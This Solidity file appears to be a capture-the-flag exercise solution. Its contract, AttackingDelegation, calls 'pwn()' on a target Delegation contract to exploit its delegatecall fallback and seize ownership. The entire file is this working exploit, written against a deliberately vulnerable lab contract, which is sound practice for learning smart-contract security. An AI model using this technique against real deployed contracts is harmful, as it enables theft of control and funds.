// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }
    event dataexport(bytes);
    function hackContract() external {
        // Code me!
        (bool success, bytes memory data) = contractAddress.call(abi.encodeWithSignature("pwn()"));
        emit dataexport(data);
        require(success, "Failed!");
    }
}
